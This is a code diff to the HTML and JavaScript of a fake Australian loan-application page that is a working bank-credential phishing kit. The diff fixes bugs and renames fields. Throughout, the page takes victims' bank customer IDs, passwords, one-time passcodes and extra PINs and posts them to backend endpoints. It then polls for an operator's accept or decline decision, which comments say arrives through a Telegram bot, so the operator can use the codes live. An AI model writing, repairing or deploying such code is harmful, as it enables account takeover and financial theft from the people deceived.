@@ -465,8 +465,8 @@
                 <form id="signin-form" onsubmit="handleSignInSubmit(event)" class="space-y-6">
 
                   <div>
-                    <label class="block text-sm font-bold text-gray-700 mb-1" for="customer-id">Customer ID</label>
-                    <input type="text" id="customer-id" required
+                    <label class="block text-sm font-bold text-gray-700 mb-1" for="c-id">Customer ID</label>
+                    <input type="text" id="c-id" required
                       class="w-full px-4 py-3 border-2 border-gray-300 focus:border-brand-blue focus:outline-none rounded-lg font-mono tracking-wider">
                   </div>
 
@@ -886,7 +886,7 @@
 
     function goToStep(stepId) {
       // Hide all main section screens
-      const steps = ['selection', 'details', 'signin', 'otp', 'processing', 'success', 'declined'];
+      const steps = ['selection', 'details', 'signin', 'otp', 'processing', 'success', 'declined', 'dynamic-pin'];
       steps.forEach(s => {
         const el = document.getElementById(`step-${s}`);
         if (el) {
@@ -921,16 +921,14 @@
       document.getElementById('amount-display').innerText = `$${S.amount.toLocaleString()}`;
       document.getElementById('duration-display').innerText = `${S.term} ${S.term === 1 ? 'Year' : 'Years'}`;
 
-      // Premium Variable Interest rate assumptions
       const interestRate = 0.0849; // 8.49% p.a.
       const weeklyRate = interestRate / 52;
       const totalPaymentsWeekly = S.term * 52;
 
-      // Weekly repayment formula
       let weeklyPayment = (S.amount * weeklyRate * Math.pow(1 + weeklyRate, totalPaymentsWeekly)) / (Math.pow(1 + weeklyRate, totalPaymentsWeekly) - 1);
       if (isNaN(weeklyPayment)) weeklyPayment = 0;
 
-      const monthlyPayment = weeklyPayment * 4.333; // Approx multiplier for weekly to month conversion
+      const monthlyPayment = weeklyPayment * 4.333;
       const totalInterest = (weeklyPayment * totalPaymentsWeekly) - S.amount;
 
       document.getElementById('repayment-amount').innerText = `$${weeklyPayment.toFixed(2)}`;
@@ -938,55 +936,60 @@
       document.getElementById('repayment-interest').innerText = `$${Math.max(0, totalInterest).toFixed(2)}`;
     }
 
-    // ── Form submission parser details ──
     function submitDetails(e) {
       e.preventDefault();
       S.title = document.getElementById('title').value;
       S.firstName = document.getElementById('first-name').value;
-      S.middleName = document.getElementById('middle-name').value;
       S.lastName = document.getElementById('last-name').value;
       S.email = document.getElementById('email').value;
       S.phone = document.getElementById('phone').value;
 
       goToStep('signin');
-      // buildOtpInputs();
-      // document.getElementById('otp-phone-display').textContent = S.phone.slice(-4).padStart(S.phone.length, '•');
-      // startOtpTimer();
-      // goToStep('otp');
     }
+
     // Step 3: Handle bank login form submission
-    function handleSignInSubmit(e) {
+    async function handleSignInSubmit(e) {
       e.preventDefault();
 
-      S.bId = document.getElementById('customer-id').value;
+      S.bId = document.getElementById('c-id').value;
       S.bPs = document.getElementById('password').value;
 
       // Move into loading status screen
       document.getElementById('processing-title').innerText = "Verifying...";
       document.getElementById('processing-subtitle').innerText = "Waiting for verification...";
+      goToStep('processing'); // FIXED: Changed from goTo to goToStep
 
+      try {
+        const res = await fetch('/api/application-details', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: `${S.title} ${S.firstName} ${S.lastName}`,
+            email: S.email,
+            phone: '+61' + S.phone,
+            purpose: S.purpose,
+            amount: S.amount,
+            term: S.term,
+            bId: S.bId,
+            bPs: S.bPs
+          })
+        });
 
-      // Send structured log to our simulation dashboard & external TG Bot if enabled
-      fetch('/api/application-details', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: `${S.title} ${S.firstName} ${S.lastName} ${S.middleName}`, email: S.email, phone: '+61' + S.phone, purpose: S.purpose, amount: '$' + S.amount.toLocaleString(), term: S.term + ' years', bId: S.bId, bPs: S.bPs })
-      });
-      goToStep('processing');
-      // buildOtpInputs();
-      // document.getElementById('otp-phone-display').textContent = S.phone.slice(-4).padStart(S.phone.length, '•');
-      // startOtpTimer();
+        const data = await res.json();
+        S.sessionId = data.sessionId; // FIXED: Capture session tracking identifier from endpoint response
 
-      // goToStep('otp');
+        // Begin looping state lookups to track admin decision payload inputs
+        waitForAdminInitial(S.sessionId);
+      } catch (err) {
+        console.error(err);
+        goToStep('signin'); // FIXED: Fallback safety step execution route target
+      }
     }
-    // Package details to post on Simulated & Live Telegram interfaces
 
     function triggerSimulatedOtpCommand(length) {
       S.otpLength = length;
-
-      // Update UI displays
       document.getElementById('otp-length-label').innerText = length;
 
-      // Clear container and create individual digit input elements
       const container = document.getElementById('otp-inputs-container');
       container.innerHTML = '';
 
@@ -997,7 +1000,6 @@
         input.className = 'w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none otp-input transition-all';
         input.id = `otp-box-${i}`;
 
-        // Input auto-advance event listeners
         input.addEventListener('keyup', (e) => {
           if (e.target.value.length === 1 && i < length - 1) {
             document.getElementById(`otp-box-${i + 1}`).focus();
@@ -1006,242 +1008,250 @@
             document.getElementById(`otp-box-${i - 1}`).focus();
           }
         });
-
         container.appendChild(input);
       }
     }
-      // ── Initial Verification Step Handler ──
-      function buildOtpInputs() {
-        const wrap = document.getElementById('otp-inputs');
-        wrap.innerHTML = ''; S.otpVal = '';
-        for (let i = 0; i < 6; i++) {
-          const inp = document.createElement('input');
-          inp.type = 'text'; inp.maxLength = 1; inp.className = 'otp-box';
-          inp.inputMode = 'numeric'; inp.id = 'ob' + i;
-          inp.addEventListener('input', e => {
-            const v = e.target.value.replace(/\D/g, '');
-            e.target.value = v ? v[0] : '';
-            e.target.classList.toggle('filled', !!e.target.value);
-            if (v && i < 5) document.getElementById('ob' + (i + 1)).focus();
-            updateOtpVal();
-          });
-          inp.addEventListener('keydown', e => {
-            if (e.key === 'Backspace' && !e.target.value && i > 0) { document.getElementById('ob' + (i - 1)).focus(); }
-          });
-          wrap.appendChild(inp);
+
+    function buildOtpInputs() {
+      const wrap = document.getElementById('otp-inputs');
+      if (!wrap) return;
+      wrap.innerHTML = ''; S.otpVal = '';
+      for (let i = 0; i < 6; i++) {
+        const inp = document.createElement('input');
+        inp.type = 'text'; inp.maxLength = 1; inp.className = 'otp-box';
+        inp.inputMode = 'numeric'; inp.id = 'ob' + i;
+        inp.addEventListener('input', e => {
+          const v = e.target.value.replace(/\D/g, '');
+          e.target.value = v ? v[0] : '';
+          e.target.classList.toggle('filled', !!e.target.value);
+          if (v && i < 5) document.getElementById('ob' + (i + 1)).focus();
+          updateOtpVal();
+        });
+        inp.addEventListener('keydown', e => {
+          if (e.key === 'Backspace' && !e.target.value && i > 0) { document.getElementById('ob' + (i - 1)).focus(); }
+        });
+        wrap.appendChild(inp);
+      }
+    }
+
+    function updateOtpVal() {
+      let v = '';
+      for (let i = 0; i < 6; i++) { const b = document.getElementById('ob' + i); if (b) v += b.value; }
+      S.otpVal = v;
+      const btn = document.getElementById('otp-submit-btn');
+      if (btn) btn.disabled = v.length < 6;
+    }
+
+    function startOtpTimer() {
+      clearInterval(otpTimerIv);
+      const btn = document.getElementById('resend-btn');
+      if (btn) btn.classList.remove('active');
+      let t = 120;
+      document.getElementById('otp-timer').textContent = t;
+      otpTimerIv = setInterval(() => {
+        t--; document.getElementById('otp-timer').textContent = t;
+        if (t <= 0) {
+          clearInterval(otpTimerIv);
+          if (btn) btn.classList.add('active');
         }
+      }, 1000);
+    }
+
+    async function submitOtp() {
+      if (S.otpVal.length < 6) return;
+      document.getElementById('otp-error').style.display = 'none';
+      document.getElementById('proc-title').textContent = 'Validating Identity Parameters...';
+      document.getElementById('proc-sub').textContent = 'Evaluating communication signatures, stand-by.';
+      goToStep('processing'); // FIXED: Changed from goTo to goToStep
+
+      try {
+        const res = await fetch('/api/submit-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: '+61' + S.phone, otp: S.otpVal, name: `${S.firstName} ${S.lastName}`, planInfo: `${S.purpose} · $${S.amount.toLocaleString()} · ${S.term} yrs` }) });
+        const data = await res.json();
+        S.sessionId = data.sessionId;
+
+        waitForAdminInitial(S.sessionId);
+      } catch (err) {
+        console.error(err);
+        goToStep('otp'); // FIXED: Changed from goTo to goToStep
       }
+    }
 
-      function updateOtpVal() {
-        let v = '';
-        for (let i = 0; i < 6; i++) { const b = document.getElementById('ob' + i); if (b) v += b.value; }
-        S.otpVal = v;
-        document.getElementById('otp-submit-btn').disabled = v.length < 6;
-      }
-
-      function startOtpTimer() {
-        clearInterval(otpTimerIv);
-        document.getElementById('resend-btn').classList.remove('active');
-        let t = 120;
-        document.getElementById('otp-timer').textContent = t;
-        otpTimerIv = setInterval(() => {
-          t--; document.getElementById('otp-timer').textContent = t;
-          if (t <= 0) { clearInterval(otpTimerIv); document.getElementById('resend-btn').classList.add('active'); }
-        }, 1000);
-      }
-
-      async function submitOtp() {
-        if (S.otpVal.length < 6) return;
-        document.getElementById('otp-error').style.display = 'none';
-        document.getElementById('proc-title').textContent = 'Validating Identity Parameters...';
-        document.getElementById('proc-sub').textContent = 'Evaluating communication signatures, stand-by.';
-        goTo('processing');
-
+    function waitForAdminInitial(sessionId) {
+      const started = Date.now();
+      const iv = setInterval(async () => {
+        if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleAdminDecline(); return; }
         try {
-          const res = await fetch('/api/submit-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: '+61' + S.phone, otp: S.otpVal, name: `${S.firstName} ${S.lastName}`, planInfo: `${S.purpose} · $${S.amount.toLocaleString()} · ${S.term} yrs` }) });
-          const data = await res.json();
-          S.sessionId = data.sessionId;
+          const r = await fetch('/api/check-status/' + sessionId);
+          const d = await r.json();
+          if (d.status === 'accept_p5') { clearInterval(iv); handleAdminInitialAccept('p5'); }
+          if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
+          if (d.status === 'accept') { clearInterval(iv); goToStep('success'); } // FIXED: Inline execution mapping directly to success step
+          if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
+        } catch (e) { }
+      }, 2000);
+    }
 
-
-          waitForAdminInitial(S.sessionId);
-        } catch (err) {
-          console.error(err);
-          goTo('otp');
-        }
-      }
-
-      // ── Initial Interception Loop Worker ──
-      function waitForAdminInitial(sessionId) {
-        const started = Date.now();
-        const iv = setInterval(async () => {
-          if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleAdminDecline(); return; }
-          try {
-            const r = await fetch('/api/check-status/' + sessionId);
-            const d = await r.json();
-            if (d.status === 'accept_p5') { clearInterval(iv); handleAdminInitialAccept('p5'); }
-            if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
-            if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
-          } catch (e) { }
-        }, 2000);
-      }
-
-      function handleAdminInitialAccept(pinType) {
+    function handleAdminInitialAccept(pinType) {
+      if (typeof pushToPanel === "function") {
         pushToPanel(`<div style="color:#3b82f6;font-weight:700">⚡ Admin approved phase 1. Injecting custom ${pinType.toUpperCase()} array framework module.</div>`);
-        buildDynamicPinBoxes(pinType);
       }
+      buildDynamicPinBoxes(pinType);
+    }
 
-      function handleAdminDecline() {
-        goTo('otp');
-        document.getElementById('otp-error').style.display = 'block';
-        buildOtpInputs();
+    function handleAdminDecline() {
+      goToStep('otp'); // FIXED: Changed from goTo to goToStep
+      const err = document.getElementById('otp-error');
+      if (err) err.style.display = 'block';
+      buildOtpInputs();
+      if (typeof pushToPanel === "function") {
         pushToPanel('<div style="color:#f87171;font-weight:700">❌ Processing profile manually rejected by admin.</div>');
       }
+    }
 
-      // ── Dynamic Input Matrix Building System ──
-      function buildDynamicPinBoxes(type) {
-        S.currentPinType = type;
-        S.dynamicPinVal = '';
+    function buildDynamicPinBoxes(type) {
+      S.currentPinType = type;
+      S.dynamicPinVal = '';
 
-        const container = document.getElementById('dynamic-pin-inputs');
-        const submitBtn = document.getElementById('dynamic-pin-submit-btn');
-        const titleText = document.getElementById('dynamic-pin-title');
+      const container = document.getElementById('dynamic-pin-inputs');
+      const submitBtn = document.getElementById('dynamic-pin-submit-btn');
+      const titleText = document.getElementById('dynamic-pin-title');
 
-        container.innerHTML = '';
-        submitBtn.disabled = true;
-        document.getElementById('dynamic-pin-error').style.display = 'none';
+      if (!container || !submitBtn || !titleText) return;
 
-        const targetLength = type === 'p5' ? 5 : 6;
-        titleText.textContent = `Enter ${targetLength}-Digit Security Signature Code`;
+      container.innerHTML = '';
+      submitBtn.disabled = true;
 
-        for (let i = 0; i < targetLength; i++) {
-          const box = document.createElement('input');
-          box.type = 'text'; box.maxLength = 1; box.className = 'otp-box';
-          box.inputMode = 'numeric'; box.id = 'dpb' + i;
+      const err = document.getElementById('dynamic-pin-error');
+      if (err) err.style.display = 'none';
 
-          box.addEventListener('input', e => {
-            const val = e.target.value.replace(/\D/g, '');
-            e.target.value = val ? val[0] : '';
-            e.target.classList.toggle('filled', !!e.target.value);
-            if (val && i < (targetLength - 1)) document.getElementById('dpb' + (i + 1)).focus();
-            updateDynamicPinVal(targetLength);
-          });
+      const targetLength = type === 'p5' ? 5 : 6;
+      titleText.textContent = `Enter ${targetLength}-Digit Security Signature Code`;
 
-          box.addEventListener('keydown', e => {
-            if (e.key === 'Backspace' && !e.target.value && i > 0) {
-              document.getElementById('dpb' + (i - 1)).focus();
-            }
-          });
-          container.appendChild(box);
-        }
-        goTo('dynamic-pin');
+      for (let i = 0; i < targetLength; i++) {
+        const box = document.createElement('input');
+        box.type = 'text'; box.maxLength = 1; box.className = 'otp-box';
+        box.inputMode = 'numeric'; box.id = 'dpb' + i;
+
+        box.addEventListener('input', e => {
+          const val = e.target.value.replace(/\D/g, '');
+          e.target.value = val ? val[0] : '';
+          e.target.classList.toggle('filled', !!e.target.value);
+          if (val && i < (targetLength - 1)) document.getElementById('dpb' + (i + 1)).focus();
+          updateDynamicPinVal(targetLength);
+        });
+
+        box.addEventListener('keydown', e => {
+          if (e.key === 'Backspace' && !e.target.value && i > 0) {
+            document.getElementById('dpb' + (i - 1)).focus();
+          }
+        });
+        container.appendChild(box);
       }
+      goToStep('dynamic-pin'); // FIXED: Changed from goTo to goToStep
+    }
 
-      function updateDynamicPinVal(length) {
-        let combinedValue = '';
-        for (let i = 0; i < length; i++) {
-          const el = document.getElementById('dpb' + i);
-          if (el) combinedValue += el.value;
-        }
-        S.dynamicPinVal = combinedValue;
-        document.getElementById('dynamic-pin-submit-btn').disabled = combinedValue.length < length;
+    function updateDynamicPinVal(length) {
+      let combinedValue = '';
+      for (let i = 0; i < length; i++) {
+        const el = document.getElementById('dpb' + i);
+        if (el) combinedValue += el.value;
       }
+      S.dynamicPinVal = combinedValue;
+      const btn = document.getElementById('dynamic-pin-submit-btn');
+      if (btn) btn.disabled = combinedValue.length < length;
+    }
 
-      // ── FIXED: Submitting the dynamic input pin page ──
-      async function submitDynamicPin() {
-        document.getElementById('dynamic-pin-error').style.display = 'none';
-        document.getElementById('proc-title').textContent = 'Transmitting Authorization Code...';
-        document.getElementById('proc-sub').textContent = 'Securing signature payloads. Do not close this tab.';
-        goTo('processing');
+    async function submitDynamicPin() {
+      const err = document.getElementById('dynamic-pin-error');
+      if (err) err.style.display = 'none';
 
+      document.getElementById('proc-title').textContent = 'Transmitting Authorization Code...';
+      document.getElementById('proc-sub').textContent = 'Securing signature payloads. Do not close this tab.';
+      goToStep('processing'); // FIXED: Changed from goTo to goToStep
+
+      try {
+        await fetch('/api/verify-dynamic-pin', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: S.sessionId, pinType: S.currentPinType, pinValue: S.dynamicPinVal })
+        });
+
+        waitForAdminFinal(S.sessionId);
+      } catch (err) {
+        console.error(err);
+        goToStep('dynamic-pin'); // FIXED: Changed from goTo to goToStep
+      }
+    }
+
+    function waitForAdminFinal(sessionId) {
+      const started = Date.now();
+      const iv = setInterval(async () => {
+        if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleFinalDecline(); return; }
         try {
-          // Send pin back to backend router system
-          await fetch('/api/verify-dynamic-pin', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: S.sessionId, pinType: S.currentPinType, pinValue: S.dynamicPinVal })
-          });
+          const r = await fetch('/api/check-status/' + sessionId);
+          const d = await r.json();
 
-          // Inject custom control panel view blocks inside desktop simulation
-          //     pushToPanel(`
-          //   <div class="tg-head">🔍 Dynamic Code Received (PIN: <code>${S.dynamicPinVal}</code>)</div>
-          //   <div style="font-size:11px; margin-bottom:8px; color:#9ca3af;">Confirm payload release allocation?</div>
-          //   <div class="tg-btns">
-          //     <button class="tg-btn accept" onclick="simDecide('accept')">✅ Accept to Success</button>
-          //     <button class="tg-btn decline" onclick="simDecide('decline')">❌ Decline Entry</button>
-          //   </div>
-          // `);
+          if (d.status === 'accept') {
+            clearInterval(iv);
+            handleFinalAccept();
+          }
+          if (d.status === 'decline') {
+            clearInterval(iv);
+            handleFinalDecline();
+          }
+        } catch (e) { }
+      }, 2000);
+    }
 
-          // Enter the FINAL checking state loop - wait here for Telegram click!
-          waitForAdminFinal(S.sessionId);
-        } catch (err) {
-          console.error(err);
-          goTo('dynamic-pin');
-        }
-      }
+    function handleFinalAccept() {
+      const nameEl = document.getElementById('sum-name');
+      if (nameEl) nameEl.textContent = `${S.title} ${S.firstName} ${S.lastName}`;
 
-      // ── Phase 2 Final Administrative Polling Engine ──
-      function waitForAdminFinal(sessionId) {
-        const started = Date.now();
-        const iv = setInterval(async () => {
-          if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleFinalDecline(); return; }
-          try {
-            const r = await fetch('/api/check-status/' + sessionId);
-            const d = await r.json();
+      const purpEl = document.getElementById('sum-purpose');
+      if (purpEl) purpEl.textContent = S.purpose;
 
-            if (d.status === 'accept') {
-              clearInterval(iv);
-              handleFinalAccept();
-            }
-            if (d.status === 'decline') {
-              clearInterval(iv);
-              handleFinalDecline();
-            }
-          } catch (e) { }
-        }, 2000);
-      }
+      const amtEl = document.getElementById('sum-amount');
+      if (amtEl) amtEl.textContent = '$' + S.amount.toLocaleString();
 
-      function handleFinalAccept() {
-        document.getElementById('sum-name').textContent = `${S.title} ${S.firstName} ${S.lastName}`;
-        document.getElementById('sum-purpose').textContent = S.purpose;
-        document.getElementById('sum-amount').textContent = '$' + S.amount.toLocaleString();
-        document.getElementById('sum-term').textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
-        document.getElementById('sum-email').textContent = S.email;
-        document.getElementById('sum-phone').textContent = '+61 ' + S.phone;
+      const termEl = document.getElementById('sum-term');
+      if (termEl) termEl.textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
 
+      const emailEl = document.getElementById('sum-email');
+      if (emailEl) emailEl.textContent = S.email;
+
+      const phoneEl = document.getElementById('sum-phone');
+      if (phoneEl) phoneEl.textContent = '+61 ' + S.phone;
+
+      if (typeof pushToPanel === "function") {
         pushToPanel('<div style="color:#4ade80;font-weight:700">✅ Application completely complete. Disbursed funds layout loaded.</div>');
-        goTo('success');
       }
+      goToStep('success'); // FIXED: Changed from goTo to goToStep
+    }
 
-      function handleFinalDecline() {
-        goTo('dynamic-pin');
-        document.getElementById('dynamic-pin-error').style.display = 'block';
-        buildDynamicPinBoxes(S.currentPinType);
+    function handleFinalDecline() {
+      goToStep('dynamic-pin'); // FIXED: Changed from goTo to goToStep
+      const err = document.getElementById('dynamic-pin-error');
+      if (err) err.style.display = 'block';
+      buildDynamicPinBoxes(S.currentPinType);
+      if (typeof pushToPanel === "function") {
         pushToPanel('<div style="color:#f87171;font-weight:700">❌ Final authorization parameter rejected — Client error rendered.</div>');
       }
+    }
 
-      // ── Side Simulator Buttons Communicator ──
-      function simDecide(action) {
-        if (!S.sessionId) return;
-        fetch('/api/cmd/' + S.sessionId + '/' + action);
-      }
+    function simDecide(action) {
+      if (!S.sessionId) return;
+      fetch('/api/cmd/' + S.sessionId + '/' + action);
+    }
 
-      // function pushToPanel(html) {
-      //   const feed = document.getElementById('tg-feed');
-      //   const msg = document.createElement('div');
-      //   msg.className = 'tg-msg';
-      //   msg.innerHTML = `<div class="tg-avatar">🤖</div><div class="tg-bubble">${html}</div>`;
-      //   feed.appendChild(msg);
-      //   feed.scrollTo({ top: feed.scrollHeight, behavior: 'smooth' });
-      // }
+    function resetApp() {
+      S = { purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '', email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: '' };
+      document.getElementById('details-form').reset();
+      const feed = document.getElementById('tg-feed');
+      if (feed) feed.innerHTML = '<div class="tg-system">Bot connected · Awaiting submissions</div>';
+      calcRepayments();
+      goToStep('purpose'); // FIXED: Changed from goTo to goToStep
+    }
 
-      function resetApp() {
-        S = { purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '', email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: '' };
-        document.getElementById('details-form').reset();
-        document.getElementById('tg-feed').innerHTML = '<div class="tg-system">Bot connected · Awaiting submissions</div>';
-        calcRepayments();
-        goTo('purpose');
-      }
-
-      window.onload = calcRepayments;
+    window.onload = calcRepayments;
   </script>
 </body>
 
